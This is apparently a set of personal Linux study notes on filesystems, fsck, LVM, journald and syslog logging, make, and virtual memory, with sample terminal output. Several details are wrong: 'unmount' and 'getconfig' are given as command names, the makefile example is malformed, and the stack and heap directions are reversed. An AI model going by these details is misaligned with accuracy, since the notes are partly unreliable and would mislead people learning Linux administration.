<li>You can then mount using the UUID by:
<ul>
<li><code>mount UUID=&lt;insert UUID here&gt; /mnt/mydisk</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><em>The number of options available for the mount command is staggering. You should review the man page for more info</em></p>
<h4 id="bufferingcachecaching"><a class="header" href="#bufferingcachecaching">Buffering/Cache/Caching</a></h4>
<ul>
<li>Linux, like other Unix variants, buffer writes to the disk. This means that the kernel doesn‚Äôt immediately write changes to the disk. But will instead write the changes to a buffer in RAM and then later write them to the disk when it deems appropriate.</li>
<li>When you unmount a file system with <code>unmount</code>, it‚Äôs changes are automatically written to the disk from the buffer (why is why you should always unmount partitions before removing them from the system, i.e. USB drives). However, you can also force this to happen using the <code>sync</code> command.</li>
<li>The kernel also uses a cache to store reads from the disk. This way, if a process continually reads the same data from the disk, it doesn‚Äôt have to go to the disk every time to fetch the data, rather using the cache to read the data from.</li>
</ul>
<h4 id="automatically-mounting-filesystems-at-boot-time"><a class="header" href="#automatically-mounting-filesystems-at-boot-time">Automatically mounting filesystems at boot time</a></h4>
<ul>
<li>The <code>/etc/fstab</code> file is used to automatically mount filesystems at boot time</li>
<li>There are two alternatives to <code>/etc/fstab</code>
<ul>
<li><code>/etc/fstab.d/</code> directory. This directory can contain individual filesystem configuration files (one for each filesystem).</li>
<li>Systemd unit files.</li>
</ul>
</li>
</ul>
<h4 id="filesystem-utilization"><a class="header" href="#filesystem-utilization">Filesystem Utilization</a></h4>
<ul>
<li>To view the utilization of your currently mounted filesytem, you can use the <code>df</code> command.
<ul>
<li>Pass the <code>-h</code> flag to view free space in a human readable form
<ul>
<li>Example: <code>df -h</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="checking-and-repairing-filesystems"><a class="header" href="#checking-and-repairing-filesystems">Checking and Repairing Filesystems</a></h4>
<ul>
<li>Filesystem errors are usually due to a user shutting down a system in a wrong way (like pulling the power cable). Such situations could leave the filesystem cache in memory not matching the data on the disk. This is especially bad if the system is in the process of modifying the filesystem when you give it a kick. Many filesystems support journaling (ext3+ filesystems for example), but you should always shut down a system properly.</li>
<li>The tool to check a filesystem for errors is <code>fsck</code>. There is a different version of <code>fsck</code> for each filesystem that linux supports. For example, the ext filesystems will use <code>e2fsck</code> to check the filesystem for errors. However, you don‚Äôt need to run <code>e2fsck</code> directly. You can just run <code>fsck</code> and it will usually detect the filesystems and run the appropriate repair tool.</li>
<li>You should <strong>never</strong> run <code>fsck</code> on a mounted filesystem. The kernel may alter data in the filesystem as you run the check, causing runtime mismatches that can crash the system and corrupt files. There is one exception to this rule. If you mount the root partition in read-only, single-user mode, you can run <code>fsck</code> on it.</li>
<li>When <code>fsck</code> asks you about reconnecting an inode, it has found a file that doesn‚Äôt appear to have a name. When reconnecting an inode, <code>fsck</code> will place the file in the lost+found directory with a number as the name. <code>fsck</code> does this by walking through the inode table and directory structure to generate new link counts and a new block allocation map (such as the block bitmap), and then it compares this newly generated data with the filesystem on the disk. If there are mismatches, <code>fsck</code> must fix the link counts and determine what to do with any inodes and/or data that didn‚Äôt come up when it traversed the directory structure.</li>
<li>On a system that has <strong>many</strong> problems, <code>fsck</code> can make things worse. One way to tell if you should cancel the <code>fsck</code> utility is if it asks <strong>a lot</strong> of questions while running the repair process. This is usually indicative of a bigger problem. If you think this is the case, you can run <code>fsck -n</code> to run <code>fsck</code> in dry mode (no changes will be made to the partition).</li>
<li>If you suspect that a superblock is corrupt, perhaps because someone overwrote the beginning of the disk, you might be able to recover the filesystem with one of the superblock backups that <code>mkfs</code> creates. Use <code>fsck -b &lt;num&gt;</code> to replace the corrupted superblock with an alternate at <em>num</em> and hope for the best. If you don‚Äôt know where to find a backup for the superblock, you can run <code>mkfs -n</code> on the device to view a list of superblock backup numbers without destroying your data.</li>
<li>You normally do not need to check ext3/4 filesystems manually because the journal ensures data integrity.</li>
<li>The kernel will not mount an ext3/4 filesystems with a non-empty journal. You can flush the journal using <code>e2fsck -fy /dev/&lt;device&gt;</code></li>
</ul>
<h4 id="special-purpose-filesystems"><a class="header" href="#special-purpose-filesystems">Special purpose filesystems</a></h4>
<ul>
<li>proc - mounted on <code>/proc</code>. Each numbered directory inside <code>/proc</code> refers to the PID of a running process on the system. The directory <code>/proc/self</code> represents the current process.</li>
<li>sysfs - mounted on <code>/sys</code>. See <code>./devices.md</code> for more info.</li>
<li>tmpfs - mounted on <code>/run</code> and other locations. Allows you to use physical memory and swap space as temporary storage.</li>
<li>squashfs - a type of read-only filesystem where content is stored in a compressed format and extracted on-demand through a loopback device.</li>
<li>overlay - a filesystem that merges directories in a composite directory. Often used by containers.</li>
</ul>
<h4 id="swap-space"><a class="header" href="#swap-space">Swap space</a></h4>
<ul>
<li>Swap space is used to augment the RAM on a machine with disk space</li>
<li>If you run out of physical memory, the Linux virtual memory system can move pages of memory to and from disk storage (swap space). This is referred to as paging.</li>
<li>You can use <code>mkswap</code> to create swap space on a partition. Then use <code>swapon</code> to enable it. You can also use <code>swapoff</code> to disable swap space.</li>
<li>In addition to using disk space for swap, you can also use a file. You can first create the file with <code>dd</code>. Example: <code>dd if=/dev/zero of=/swapfile bs=1024k count=&lt;size in megabytes&gt;</code></li>
<li>High performance servers should not have swap space and should avoid disk access if at all possible.</li>
</ul>
<h4 id="prefetch"><a class="header" href="#prefetch">Prefetch</a></h4>
<p>A common file system workload involves reading a large amount of file data sequentially, for example, for a file system backup. This data may be too large to fit in the cache, or it may be read only once, and is therefore unlikely to remain in the cache. Such a workload would perform relatively poorly, as it would have a low cache-hit ratio.</p>
<p>Prefetch is a common file system feature for solving this problem. It can detect a sequential read workload based on the current and previous file I/O offsets, and then predict and issue disk reads before the application has requested them. This populates the file system cache, so that if the application does perform the expected read, it results in a cache-hit, rather than reading from much slower disk.</p>
<p>Prefetch can typically be tuned in most systems.</p>
<h4 id="write-back-caching"><a class="header" href="#write-back-caching">Write-back Caching</a></h4>
<p>Write-back caching is commonly used by file systems to improve write performance. It works by treating writes as completed after the transfer to main memory, and writing them to disk sometime later, asynchronously. The file system process for writing this ‚Äòdirty‚Äô data to disk is called ‚Äòflushing‚Äô. The trade-off of write-back cache is reliability. DRAM-based main memory is volatile, and dirty data can be lost in the event of a power failure. Data could also be written to disk incompletely, leaving the disk in a corrupt state. If file-system metadata becomes corrupted, the file system may no longer load.</p>
<h4 id="synchronous-writes"><a class="header" href="#synchronous-writes">Synchronous writes</a></h4>
<p>Synchronous writes are used by some applications such as database log writers, where the risk of data corruption for asynchronous writes is unacceptable.</p>
<h4 id="vfs-virtual-file-system"><a class="header" href="#vfs-virtual-file-system">VFS (Virtual File System)</a></h4>
<p>VFS provides a common interface for different file system types. Prior to VFS, different file systems required different system calls for interacting with each. The calls for interacting with a FAT file system were different than those for a EXT file system.</p>
<h4 id="file-system-caches"><a class="header" href="#file-system-caches">File System Caches</a></h4>
<p>Unix originally only had the buffer cache to improve performance of block device access. Nowadays, Linux has multiple different cache types.</p>
<ul>
<li>Page Cache</li>
<li>Buffer cache</li>
<li>Directory Cache</li>
<li>inode cache</li>
</ul>
<h4 id="copy-on-write"><a class="header" href="#copy-on-write">Copy on write</a></h4>
<p>A Copy on write (COW) file system does not overwrite existing blocks but instead follows these steps:</p>
<ol>
<li>Write blocks to a new location (a new copy)</li>
<li>Update references to new blocks</li>
<li>Add old blocks to the free list</li>
</ol>
<p>This helps maintain file system integrity in the event of a system failure, and also helps improve performance by turning random writes into sequential ones</p>
<h1 id="troubleshooting-file-systems"><a class="header" href="#troubleshooting-file-systems">Troubleshooting File Systems</a></h1>
<p>Key metrics for file systems include:</p>
<ul>
<li>Operation Rate</li>
<li>Operation latency</li>
</ul>
<p>In Linux, there are typically no readily available metrics for file system operations (the exception being NFS, via <code>nfsstat</code>).</p>
<h3 id="tools-2"><a class="header" href="#tools-2">Tools:</a></h3>
<ul>
<li><code>mount</code></li>
<li><code>free</code></li>
<li><code>top</code></li>
<li><code>vmstat</code></li>
<li><code>sar</code></li>
<li><code>slabtop</code></li>
<li><code>filetop</code></li>
<li><code>cachestat</code></li>
<li><code>fsck</code></li>
<li><code>ext4slower</code></li>
<li><code>e2fsck</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="groups-1"><a class="header" href="#groups-1">Groups</a></h1>
<p>Groups offer a way to share files and directories among users.</p>
<ul>
<li>
<p>The <code>/etc/group</code> file defines the group IDs. Each line in this file represents a group, with fields separated by colons. There are 4 fields:</p>
<ol>
<li>The group name</li>
<li>The group password (this can be ignored)</li>
<li>The group Id</li>
<li>An optional list of users that belong to the group</li>
</ol>
</li>
<li>
<p>To see the groups you belong to, run <code>groups</code></p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hashing-1"><a class="header" href="#hashing-1">Hashing</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="interrupts-and-traps"><a class="header" href="#interrupts-and-traps">Interrupts and Traps</a></h1>
<ul>
<li>Most operating systems are implemented as interrupt-driven systems. Meaning the OS doesn‚Äôt run until some entity needs it to do something, the OS is woken up to handle a request.</li>
<li>System calls are implemented as special trap instructions that are defined as part of the CPU‚Äôs ISA.</li>
<li>Each system call is associated with a number. When an application wants to invoke a system call, it places the desired call‚Äôs number in a known location and issues a trap instruction to interrupt the OS. The trap triggers the CPU to stop executing its current instruction, and proceed execution the requesting application‚Äôs instruction.</li>
<li>Interrupts that come from the hardware layer, such as when a NIC receives data from the network, are typically referred to as hardware interrupts, or just interrupts. Interrupts that come from the software layer as the result of instruction execution, are known as traps.</li>
<li>Unlike system calls, hardware interrupts are delivered via the CPU‚Äôs interrupt bus. A device place‚Äôs a signal on the interrupt bus when it needs the CPU‚Äôs attention.</li>
<li>When the CPU is done handling an interrupt, it resumes processing it‚Äôs state before the interrupt occurred.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kernel-subsystems"><a class="header" href="#kernel-subsystems">kernel subsystems</a></h1>
<p>Linux kernel has 5 subsystems:</p>
<ol>
<li>The Process Scheduler (SCHED)</li>
<li>The Memory Manager (MM)</li>
<li>The Virtual File System (VFS)</li>
<li>The Networking Interface (NET)</li>
<li>The Inter-process Communication (IPC)</li>
</ol>
<h1 id="kernel-structure-and-subsystem-dependencies"><a class="header" href="#kernel-structure-and-subsystem-dependencies">Kernel structure and subsystem dependencies</a></h1>
<p><img src="images/kernel_depends.png" alt=""></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="key-value-store"><a class="header" href="#key-value-store">Key Value Store</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hard-and-soft-links"><a class="header" href="#hard-and-soft-links">Hard and Soft Links</a></h1>
<p>Use <code>ln</code> to manage soft and hard links</p>
<h4 id="inodes-1"><a class="header" href="#inodes-1">Inodes</a></h4>
<ul>
<li>An inode is a reference to a file on the disk</li>
<li>The stat command can be used to view inodes</li>
<li>When there are 0 links to an inode, the data itself is erased from the disk</li>
<li>Hard links point to the same inode</li>
</ul>
<h4 id="links"><a class="header" href="#links">Links</a></h4>
<ul>
<li>You can only hardlink to files, not directories</li>
<li>You cannot hardlink to files on a mount, only files on the same filesystem</li>
<li>Soft links create a shortcut directly to the file, rather than a link to the inode</li>
<li><code>readlink</code> can be used to view the file behind a softlink</li>
<li>broken soft links are highlighted in red in the output of <code>ls -l</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="commands-2"><a class="header" href="#commands-2">commands</a></h1>
<p><img src="systems/images/linux/linux_commands.png" alt=""></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="logging"><a class="header" href="#logging">Logging</a></h1>
<h2 id="journald"><a class="header" href="#journald">Journald</a></h2>
<p>Most programs write their log output to the syslog service. The syslogd daemon performs this service on traditional systems by listening for these messages and sending them to the appropriate channel (file, database, email, etc.) when received. On modern systems, journald typically does this work. <code>journalctl</code> can be used to work with journald.</p>
<p>You can determine if your system is using journald by typing <code>journalctl</code> in a shell. If the system is using journald, you will see a paged output. Unless you have a system that is using a traditional syslog daemon such as syslogd or rsyslogd, you will use the journal. To get the full output from <code>journalctl</code>, you need to run the command as root or as a user of the adm or systemd-journal groups.</p>
<ul>
<li>
<p>Some examples of using <code>journalctl</code>:</p>
<ul>
<li>To search for logs from a process using the PID: <code>journalctl _PID=555</code> (where 555 is the PID)</li>
<li>To search for messages from the past 4 hours: <code>journalctl -S -4h</code></li>
<li>To filter by unit: <code>journalctl -u sshd.service</code></li>
<li>To search by a given field: <code>journalctl -F _SYSTEMD_UNIT</code></li>
<li>If you do not know what fields are available, use: <code>journalctl -N</code></li>
<li>To view the logs from <em>this</em> boot: <code>journalctl -b</code></li>
<li>To view the logs from the previous boot: <code>journalctl -b -1</code></li>
<li>To list all boots by ID: <code>journalctl --list-boots</code></li>
<li>To view Kernel messages: <code>journalctl -k</code></li>
<li>To filter by severity level: <code>journalctl -p 3</code> (where 3 is the severity level. Values range from 0 (most important) to 7 (least important))</li>
</ul>
</li>
<li>
<p>Journal maintenance</p>
<ul>
<li>the journal files stored in <code>/var/log/journal</code> do not need to be rotated. journald handles the maintenance of these files.</li>
</ul>
</li>
</ul>
<h2 id="syslogd"><a class="header" href="#syslogd">Syslogd</a></h2>
<p>Syslogd first appeared with the sendmail email server back in the 1980‚Äôs. Developers of other services readily adopted it, and RFC3164 was ratified to define it. The syslog mechanism is simple. It listens on a Unix domain socket, <code>/dev/log</code>. Though, it can also listen on a network socket, enabling any device on the network to send logs to it. This makes rsyslogd act as a log server.</p>
<ul>
<li>Facility, severity, and priority
<ul>
<li>Syslog sends messages of various types from different services to different destinations. Becuase of this, it needs a way to classify each message.</li>
<li>The facility is a general category of service, used to identify the service that sent the message. The available facilities in the syslog protocol are hardwired and there is no way to add your own. However, you can use a general local0 through local7 value.</li>
<li>The severity is the urgency of the log messages. This can be a value from 0 (most urgent) to 7 (least urgent)
<ul>
<li>
<ol start="0">
<li>emerg</li>
</ol>
</li>
<li>
<ol>
<li>alert</li>
</ol>
</li>
<li>
<ol start="2">
<li>crit</li>
</ol>
</li>
<li>
<ol start="3">
<li>err</li>
</ol>
</li>
<li>
<ol start="4">
<li>warn</li>
</ol>
</li>
<li>
<ol start="5">
<li>notice</li>
</ol>
</li>
<li>
<ol start="6">
<li>info</li>
</ol>
</li>
<li>
<ol start="7">
<li>debug</li>
</ol>
</li>
</ul>
</li>
<li>The facility and the severity together make up the priority, packaged as a single value in the syslog protocol. You can read more about this in RFC 5424</li>
<li></li>
<li></li>
</ul>
</li>
</ul>
<h2 id="logfile-rotation"><a class="header" href="#logfile-rotation">Logfile Rotation</a></h2>
<p>When you are using a syslog daemon, log messages get put into files somewhere on the system. These files need to be rotated on a schedule to prevent the files from consuming too much storage space. <code>logrotate</code> performs this task.</p>
<ul>
<li>How <code>logrotate</code> works:
<ol>
<li>Remove the oldest file, auth.log.3</li>
<li>Renames auth.log.2 to auth.log.3</li>
<li>Renames auth.log.1 to auth.log.2</li>
<li>Renames auth.log to auth.log.1</li>
</ol>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lvm-logical-volume-manager"><a class="header" href="#lvm-logical-volume-manager">lvm (logical volume manager)</a></h1>
<ul>
<li>
<p>LVM creates an abstraction layer between physical storage and the file system, allowing the file system to be resized and span across multiple disks</p>
</li>
<li>
<p>Physical volumes are grouped into groups of volumes, called Volume Groups. These Volume Groups are then divided into Logical Volumes</p>
</li>
<li>
<p>LVM Acronyms</p>
<ul>
<li>
<p>PV = Physical Volume, real physical storage devices</p>
<ul>
<li><code>sudo lvmdiskscan</code> can be used to list devices that may be used as physical volumes
<pre><code>04:52:03 azureadmin@centos01 ~ ‚Üí sudo lvmdiskscan
/dev/sda1  [     500.00 MiB]
/dev/sda2  [      29.02 GiB]
/dev/sda15 [     495.00 MiB]
/dev/sdb1  [     &lt;64.00 GiB]
/dev/sdf   [       5.00 GiB]
/dev/sdh   [       5.00 GiB]
/dev/sdi   [       5.00 GiB]
3 disks
4 partitions
0 LVM physical volume whole disks
0 LVM physical volumes
</code></pre>
</li>
<li><code>'sudo pvcreate /dev/sdc /dev/sdd /dev/sde</code> can be used to create a new LVM volume from 3 disks
<pre><code>04:52:06 azureadmin@centos01 ~ ‚Üí sudo pvcreate /dev/sdf /dev/sdh /dev/sdi
Physical volume "/dev/sdf" successfully created.
Physical volume "/dev/sdh" successfully created.
Physical volume "/dev/sdi" successfully created.
</code></pre>
</li>
<li><code>sudo pvs</code> can be used to list physical volumes used by LVM
<pre><code>04:52:19 azureadmin@centos01 ~ ‚Üí sudo pvs
PV         VG Fmt  Attr PSize PFree
/dev/sdf      lvm2 ---  5.00g 5.00g
/dev/sdh      lvm2 ---  5.00g 5.00g
/dev/sdi      lvm2 ---  5.00g 5.00g
</code></pre>
</li>
</ul>
</li>
<li>
<p>VG = Volume Group</p>
<ul>
<li>After LVM has physical devices (pvs), you add the pvs to a volume group (vg). This tells LVM how it can use the storage capacity</li>
<li><code>sudo vgcreate my_volume /dev/sdf /dev/sdh</code> will create a new VG with 2 PV
<pre><code>04:58:13 azureadmin@centos01 ~ ‚Üí sudo vgcreate my_vol /dev/sdf /dev/sdh
Volume group "my_vol" successfully created
</code></pre>
</li>
<li>Once disks are added to a volume group, they are seen by the system as one contiguous block of storage</li>
<li>You can add another disk to the volume group using <code>vgextend</code>
<pre><code>05:00:06 azureadmin@centos01 ~ ‚Üí sudo vgextend my_vol /dev/sdi
Volume group "my_vol" successfully extended
</code></pre>
</li>
<li>use <code>sudo vgs</code> to view the status of Volume Groups:
<pre><code>05:00:14 azureadmin@centos01 ~ ‚Üí sudo vgs
VG     #PV #LV #SN Attr   VSize   VFree
my_vol   3   0   0 wz--n- &lt;14.99g &lt;14.99g
</code></pre>
</li>
<li>use <code>sudo vgreduce my_vol /dev/sdi</code> to remove a physical volume from a volume group
<pre><code>05:00:39 azureadmin@centos01 ~ ‚Üí sudo vgreduce my_vol /dev/sdi
Removed "/dev/sdi" from volume group "my_vol"
</code></pre>
</li>
</ul>
</li>
<li>
<p>LV = Logical Volume</p>
<ul>
<li>A logical volume is similar to a partition</li>
<li><code>sudo lvcreate --size 2G --name partition1 my_vol</code> can be used to create a logical volume of 2 gigabytes
<pre><code>05:02:22 azureadmin@centos01 ~ ‚Üí sudo lvcreate --size 2G --name partition1 my_vol
Logical volume "partition1" created.
</code></pre>
</li>
<li>You can view logical volumes using <code>sudo lvs</code>
<pre><code>05:03:49 azureadmin@centos01 ~ ‚Üí sudo lvs
LV         VG     Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
partition1 my_vol -wi-a----- 2.00g
partition2 my_vol -wi-a----- 6.00g
</code></pre>
</li>
<li>to tell a logical volume to use all space on a logical volume, use <code>sudo lvresize</code>
<pre><code>05:03:50 azureadmin@centos01 ~ ‚Üí sudo lvresize --extents 100%VG my_vol/partition1
Reducing 100%VG to remaining free space 3.99 GiB in VG.
Size of logical volume my_vol/partition1 changed from 2.00 GiB (512 extents) to 3.99 GiB (1022 extents).
Logical volume my_vol/partition1 successfully resized.
</code></pre>
</li>
<li>the path to LVs on the system can be found using <code>lvdisplay</code>
<pre><code>05:08:32 azureadmin@centos01 ~ ‚Üí sudo lvdisplay  | grep "LV Path"
LV Path                /dev/my_vol/partition1
LV Path                /dev/my_vol/partition2
</code></pre>
</li>
<li>You can then add a file system to a LV using common file system management commands
<pre><code>05:08:41 azureadmin@centos01 ~ ‚Üí sudo mkfs.xfs /dev/my_vol/partition1
meta-data=/dev/my_vol/partition1 isize=512    agcount=4, agsize=261632 blks
        =                       sectsz=4096  attr=2, projid32bit=1
        =                       crc=1        finobt=1, sparse=1, rmapbt=0
        =                       reflink=1
data     =                       bsize=4096   blocks=1046528, imaxpct=25
        =                       sunit=0      swidth=0 blks
naming   =version 2              bsize=4096   ascii-ci=0, ftype=1
log      =internal log           bsize=4096   blocks=2560, version=2
        =                       sectsz=4096  sunit=1 blks, lazy-count=1
realtime =none                   extsz=4096   blocks=0, rtextents=0
Discarding blocks...Done.
</code></pre>
</li>
<li>If the LV contains a file system, you must take extra caution when resizing it. You must pass the <code>--resizefs</code> parameter to <code>lvresize</code></li>
<li><code>sudo lvresize --resizefs --size 3G my_vol\partition1</code></li>
<li>XFS file system shrinking is not supported</li>
</ul>
</li>
</ul>
</li>
<li>
<p>If you forget what commands to use for LVM, simply open the man pages for LVM and scroll to the bottom to get a list of available commands</p>
<ul>
<li><code>man lvm</code></li>
</ul>
</li>
<li>
<p><code>sudo lvmdiskscan</code> will show what disks are available</p>
</li>
<li>
<p>To create a physical volume:</p>
<ul>
<li><code>sudo pvcreate /dev/sdd /dev/sde /dev/sdf</code></li>
<li>Example:
<pre><code>[azureadmin@centos01 shares]$ sudo pvcreate /dev/sdd /dev/sde
Physical volume "/dev/sdd" successfully created.
Physical volume "/dev/sde" successfully created.
</code></pre>
</li>
<li>To list physical volumes: <code>sudo pvs</code>
<pre><code>[azureadmin@centos01 shares]$ sudo pvs
PV         VG Fmt  Attr PSize PFree
/dev/sdd      lvm2 ---  5.00g 5.00g
/dev/sde      lvm2 ---  5.00g 5.00g
</code></pre>
</li>
<li>After creating the physical volume, add it to a volume group:
<ul>
<li><code>sudo vgcreate my_volume /dev/sdd /dev/sde</code></li>
</ul>
</li>
<li>List volume groups:
<pre><code>[azureadmin@centos01 shares]$ sudo vgs
VG        #PV #LV #SN Attr   VSize VFree
my_volume   2   0   0 wz--n- 9.99g 9.99g
</code></pre>
</li>
<li>To expand a volume group, add a PV. Then use <code>vgextend</code> to add the PV to the volume group
<ul>
<li><code>sudo vgextend my_volume /dev/sdf</code></li>
</ul>
</li>
<li>You can also remove a physical volume from the volume group:
<ul>
<li><code>sudo vgreduce my_volume /dev/sdf</code></li>
</ul>
</li>
<li>Then you can remove the physical volume:
<ul>
<li><code>sudo pvremove /dev/sdf</code></li>
</ul>
</li>
<li>Logical volumes are like partitions</li>
<li>you can create a new logical volume:
<ul>
<li><code>sudo lvcreate --size 3G --name partition1 my_volume</code></li>
</ul>
</li>
<li>To grow a logical volume to use all the space it has available
<ul>
<li><code>suod lvresize --extents 100%VG my_volume/partition1</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="device-mapper"><a class="header" href="#device-mapper">Device Mapper</a></h4>
<ul>
<li>The kernel uses a driver called the device mapper to route requests for  a location on a logical volume‚Äôs block device to the true location on an actual device. After LVM has determined the structure of the logical volumes from all of the headers on the PVs, it communicates this the kernel‚Äôs device mapper driver in order to initialize the block devices for the logical volumes and load their mapping tables. It achieves this with the ioctl(2) syscall on the <code>/dev/mapper/control</code> device file</li>
<li>To get an inventory of mapped devices currently serviced by the device mapper, use <code>dmsetup</code>:
<ul>
<li><code>dmsetup info</code></li>
</ul>
</li>
<li>There is a header at the beginning of every LVM PV that identifies the volume as well as it‚Äôs volume groups and the logical volumes within.
<ul>
<li>You can view the lvm header on a physical volume using <code>dd</code>:
<ul>
<li><code>dd if=&lt;path to pv&gt; count=1000 | strings | less</code></li>
<li>Example: <code>dd if=/dev/sdb1 count=1000 | strings | less</code></li>
</ul>
</li>
<li></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="make"><a class="header" href="#make">make</a></h1>
<p>The basic idea behind make is the <em>target</em>, a goal that you want to achieve.</p>
<ul>
<li>A target can be a file or a label.</li>
<li>Targets can have dependencies.
To build a target, make follows <em>rules</em>.</li>
</ul>
<h4 id="a-simple-makefile"><a class="header" href="#a-simple-makefile">A simple makefile</a></h4>
<pre><code class="language-sh"># object files
OBJS=aux.o main.o
$myVar="building..."

all: myprog

myprog:
  echo $myVar
  $(OBJS)
  $(CC) -o myprog $(OBJS)
</code></pre>
<p>In the example above, the # in the first line denotes a comment. The second line is a macro definition that sets the <code>OBJS</code> variable to two file names. <em>all</em> is the first <strong>target</strong>. Macros are different from variables. Macro‚Äôs do not change after make has started building a target, variables can change. Variables begin with a <code>$</code>. The first target is always the default. The default target is used when you run <code>make</code> on the command line with no targets specified. The rule for building a target comes after the ‚Äú:‚Äù. <strong>make is very strict about tabs!</strong></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="memory"><a class="header" href="#memory">memory</a></h1>
<p>The CPU has a memory management unit (MMU) to add flexibility in accessing memory. The kernel assists the MMU by breaking down the memory used by a process into chunks called ‚Äòpages‚Äô. The kernel maintains a data structure, called a ‚Äòpage table‚Äô, that maps a process‚Äôs virtual page addresses into real page addresses in memory. As a process accesses memory, the MMU translates the virtual addresses used by the process into real addresses based on the kernel‚Äôs page table.</p>
<p>
A user process doesn't need all of it's memory to be immediately available in order to run. The kernel general loads and allocates pages as a process needs them; this system is known as on-demand paging or just demand paging. Let's see how a program starts and runs as a new process:
</p>

1) The kernel loads the beginning of the program's instruction code into memory pages.
2) Th ekernel may allocate some working-memory pages to the new process
3) As the process runs, it may determine that the next instruction in code isn't in any of the memory pages that the kernel loaded initially. At this point, the kernel will take over and load the necessary page into memory, and then lets the program resume execution.
<p>
You can get a system's page size by looking at the kernel configuration:
</p>

<pre><code class="language-sh">getconfig PAGE_SIZE
4096
</code></pre>
<h2 id="page-faults"><a class="header" href="#page-faults">Page Faults</a></h2>
<p>
If a memory page isn't ready when a process wants to use it, the process triggers a page fault. If a page fault occurs, the kernel takes control of the CPU from the process in order to get the page ready. There are two kinds of page faults, major and minor.
</p>

<p>
Minor page faults occur when the page is in main memory, but the MMU doesn't know where it is. A major page fault occurs when the desired memory page isn't in main memory at all, which means that the kernel must load it from disk or some other slow storage media. Major page faults will bog down a system. Some major page faults are unavoidable, like when the system loads the code from disk when running a program for the first time.
</p>

<p>You can drill down to the page faults for individual processes by using the <code>top</code>, <code>ps</code>, and <code>time</code> commands. You‚Äôll need to use the system version of time for this.</p>
<pre><code class="language-sh">ryan:todo/  |main ?:3 ‚úó|$ /usr/bin/time cal &gt; /dev/null
0.00user 0.00system 0:00.00elapsed 100%CPU (0avgtext+0avgdata 2824maxresident)k
0inputs+0outputs (0major+130minor)pagefaults 0swaps
</code></pre>
<p>As you can see in the output above, there were 0 major page faults and 130 minutes page faults when running the <code>cal</code> program.</p>
<h2 id="virtual-memory"><a class="header" href="#virtual-memory">Virtual Memory</a></h2>
<ul>
<li>
<p>The OS‚Äôs process abstraction provides each process with a virtual memory space. Virtual memory is an abstraction that gives each process its own private, logical address space in which its instructions and data are stored. Each process‚Äôs virtual address space can be thought of as an array of addressable bytes from 0 up to some maximum address. Processes cannot access the contents of one another‚Äôs address spaces.</p>
</li>
<li>
<p>Operating systems implement virtual memory as part of the lone view abstraction of processes. That is, each process only interacts with memory in terms of its own virtual address space rather than the reality of many processes sharing the computers RAM simultaneously.</p>
</li>
<li>
<p>A process‚Äôs virtual address space is divided into several sections, each of which stores a different part of the process‚Äôs memory. The top part is reserved for the OS and can only be accessed in kernel mode. The text and data parts of a process‚Äôs virtual addresss space are initialized from the program executable file. The text section contains the program instructions, and the data section contains global variables. The stack and heap sections vary in size as the process runs. Stack space grows in response to the process making function calls, and shrinks as it returns from the function calls. Heap space grows when the process dynamically allocates memory space (via calls to malloc), and shrinks when the process frees memory space (with calls to free). The heap and stack portions of a process‚Äôs memory are typically located far apart in its address space to maximize the amount of space either can use. Typically, the stack is located at the bottom of a process‚Äôs address space and grows upward. The heap is located at the top of the stack and grows downward.</p>
<pre><code>--------------------------------
|            OS Code           |
--------------------------------
|       Application Code       |
--------------------------------
|      Data (Global Vars)      |
--------------------------------
|             Heap             |
|             ‚åÑ‚åÑ‚åÑ‚åÑ             |
|                              |
|                              |
--------------------------------
|                              |
|                              |
|            ^^^^^             |
|            Stack             |
--------------------------------
</code></pre>
</li>
<li>
<p>A page fault occurs when a process tries to access a page that is not currently stored in RAM. The opposite is a page hit. To handle a page fault, the OS needs to keep track of which RAM frames are free so that it can find a free frame of RAM into which the page read from disk can be stored.</p>
</li>
<li>
<p>Page Table Entries (PTE) include a dirty bit that is used to indicate if the in-RAM copy of the page has been modified.</p>
</li>
</ul>
<h2 id="memory-addresses"><a class="header" href="#memory-addresses">Memory Addresses</a></h2>
<ul>
<li>Because processes operate within their own virtual address spaces, operating systems must make an important distinction between two types of memory addresses. Virtual addresses refer to storage locations in a processes virtual address space, and physical addresses refer to a location in RAM.</li>
<li>At any point in time, the OS stores in RAM the address space contents of many processes as well as OS code that it may map into every process‚Äôs virtual address space.</li>
</ul>
<h3 id="virtual-memory-and-virtual-addresses"><a class="header" href="#virtual-memory-and-virtual-addresses">Virtual Memory and Virtual Addresses</a></h3>
<ul>
<li>Virtual memory is the per-process view of its memory space, and virtual addresses are addresses in the process‚Äôs view of its memory. If two processes run the same binary executable, then they have will have the exact same virtual addresses for function code and for global variables in the address spaces.</li>
<li>Processors generally provide some hardware support for virtual memory. An OS can make use of this hardware support for virtual memory to perform virtual to physical address translation quickly, avoiding having to trap to the OS to handle every address translation.</li>
<li>The memory management unit (MMU) is the part of the computer hardware that implements address translation. At it‚Äôs most complete, the MMU performs full translation.</li>
</ul>
<h2 id="paging"><a class="header" href="#paging">Paging</a></h2>
<ul>
<li>Although many virtual memory systems have been implemented over the years, paging is now the mostly widely used imlementation of virtual memory.</li>
<li>In a Paged virtual memory system, the OS divides the virtual address space of each process into fixed-sized chunks called pages. The OS defines the page size for the system. Page sizes of a few kilobytes are commonly used in general purpose operating systems today. 4 KB is the default page size on many systems.</li>
<li>Physical memory is similarly divided into page-sized chunks called frames. Because pages and frames are defined to be the same size, any page of a process‚Äôs virtual memory can be stored in any frame of physical RAM.</li>
</ul>
<h3 id="virtual-and-physical-addresses-in-paged-systems"><a class="header" href="#virtual-and-physical-addresses-in-paged-systems">Virtual and Physical Addresses in Paged Systems</a></h3>
